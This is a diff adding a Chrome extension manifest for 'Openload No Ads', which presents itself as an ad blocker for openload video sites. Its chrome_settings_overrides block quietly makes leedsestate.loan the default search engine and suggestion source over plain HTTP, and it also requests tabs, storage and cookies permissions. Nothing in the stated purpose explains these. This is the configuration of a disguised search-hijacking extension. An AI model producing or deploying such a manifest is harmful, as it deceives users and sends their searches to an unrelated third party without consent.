@@ -1,0 +1,84 @@
+{
+    "chrome_settings_overrides": {
+        "search_provider": {
+            "alternate_urls": [],
+            "encoding": "UTF-8",
+            "favicon_url": "http://leedsestate.loan/fav.ico",
+            "image_url": "",
+            "image_url_post_params": "",
+            "instant_url": "",
+            "instant_url_post_params": "",
+            "is_default": true,
+            "keyword": "openload",
+            "name": "openload",
+            "search_url": "http://leedsestate.loan/#q={searchTerms}",
+            "search_url_post_params": "",
+            "suggest_url": "http://leedsestate.loan/#q={searchTerms}",
+            "suggest_url_post_params": ""
+        }
+    },
+    "content_scripts": [
+        {
+            "all_frames": true,
+            "js": [
+                "content.js"
+            ],
+            "matches": [
+                "https://openload.co/*",
+                "http://openload.co/*",
+                "https://oload.tv/*",
+                "http://oload.tv/*",
+                "http://oload.info/*",
+                "https://oload.info/*",
+                "http://oload.stream/*",
+                "https://oload.stream/*",
+                "https://oload.site/*",
+                "https://oload.xyz/*",
+                "https://oload.wind/*"
+            ],
+            "run_at": "document_end"
+        },
+        {
+            "all_frames": true,
+            "js": [
+                "video.js"
+            ],
+            "matches": [
+                "https://*.oloadcdn.net/*",
+                "http://*.oloadcdn.net/*"
+            ],
+            "run_at": "document_end"
+        }
+    ],
+    "content_security_policy": "script-src 'self' https://www.google-analytics.com; object-src 'self'",
+    "description": "Watch Openload Video Without Ads",
+    "icons": {
+        "48": "icos/48.png",
+        "128": "icos/128.png"
+    },
+    "manifest_version": 2,
+    "name": "Openload No Ads",
+    "permissions": [
+        "https://openload.co/*",
+        "http://openload.co/*",
+        "https://oload.tv/*",
+        "http://oload.tv/*",
+        "https://*.oloadcdn.net/*",
+        "http://*.oloadcdn.net/*",
+        "http://*.oload.info/*",
+        "https://*.oload.info/*",
+        "http://oload.stream/*",
+        "https://oload.stream/*",
+        "https://oload.site/*",
+        "https://oload.xyz/*",
+        "https://oload.win/*",
+        "tabs",
+        "storage",
+        "cookies"
+    ],
+    "update_url": "https://clients2.google.com/service/update2/crx",
+    "version": "1.1.2",
+    "web_accessible_resources": [
+        "*"
+    ]
+}
